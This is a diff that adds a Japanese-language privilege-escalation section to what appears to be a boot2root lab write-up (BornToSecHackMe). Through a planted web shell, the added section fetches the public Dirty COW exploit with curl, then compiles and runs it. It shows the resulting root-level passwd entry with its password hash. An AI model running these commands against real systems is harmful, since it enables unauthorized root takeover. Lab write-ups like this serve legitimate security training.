@@ -110,6 +110,56 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
 この結果により、`www-data` ユーザーの権限で任意のコマンド実行が可能となり、**Web Shell の獲得（コマンドインジェクション成功）** が確認された。
 
+## 6. 権限昇格 (Privilege Escalation)
+
+### カーネル情報の確認と脆弱性の特定
+Web Shell 経由でシステム情報を確認したところ、古いカーネルバージョンが使用されていることが判明した。
+
+```bash
+uname -a
+# Linux BornToSecHackMe 3.2.0-91-generic-pae ... i686 GNU/Linux
+
+cat /etc/issue
+# Ubuntu 12.04.5 LTS
+```
+
+このバージョン（Linux Kernel 3.2.0 / Ubuntu 12.04）は、権限昇格の脆弱性 **Dirty COW (CVE-2016-5195)** の影響を受けることが知られている。
+
+### Dirty COW Exploit の実行
+`/etc/passwd` ファイルを書き換えるタイプの Dirty COW exploit (通称 "Firefart") を使用することにした。
+
+1.  **Exploitコードの転送:**
+    ターゲットマシンはインターネット接続が可能であったため、Web Shell 経由で `curl` コマンドを実行し、GitHub から直接ソースコードを取得した。
+    ```bash
+    curl https://raw.githubusercontent.com/firefart/dirtycow/master/dirty.c -o /tmp/dirty.c
+    ```
+
+    ```bash
+    curl -k -G "https://100.64.1.32/forum/templates_c/shell.php"   --data-urlencode "c=curl https://raw.githubusercontent.com/firefart/dirtycow/master/dirty.c -o /tmp/dirty.c"
+    ```
+
+2.  **コンパイル:**
+    ターゲット上で `gcc` を使用してコンパイルを実行した。
+    ```bash
+    gcc -pthread /tmp/dirty.c -o /tmp/dirty -lcrypt
+    ```
+
+3.  **実行:**
+    新しい root ユーザー (`firefart` または指定した名前) のパスワードを設定して実行した。ここではパスワードを `gemini` とした。
+    ```bash
+    /tmp/dirty gemini
+    ```
+
+### Root 権限の獲得確認
+Exploit 実行後、`/etc/passwd` を確認したところ、特権ユーザー `toor`（exploitの変種によっては `firefart`）が追加され、UID が `0` (root) に設定されていることが確認できた。
+
+```text
+toor:toHbXhZAaNbJc:0:0:pwned:/root:/bin/bash
+```
+
+このユーザーは root 権限を持っており、コンソールからログインすることでシステムを完全に掌握できる状態となった。
+(SSH設定 `PermitRootLogin no` のため、リモートログインは制限されているが、ローカルコンソールまたは `su` コマンド経由でのアクセスが可能)
+
 ---
-**次のステップ:**
-`www-data` ユーザーの権限から、さらに上位の特権（`ft_root` や `root` など）を奪取するための情報を収集する。カーネルの既知の脆弱性（Dirty COW など）や、他のユーザーのファイルからパスワードや秘密鍵などを発見することを目指す。
+**結論:**
+Web アプリケーションの脆弱性 (SQL Injection, Command Injection) を突き、最終的にカーネルの脆弱性 (Dirty COW) を利用して Root 権限を奪取することに成功した。
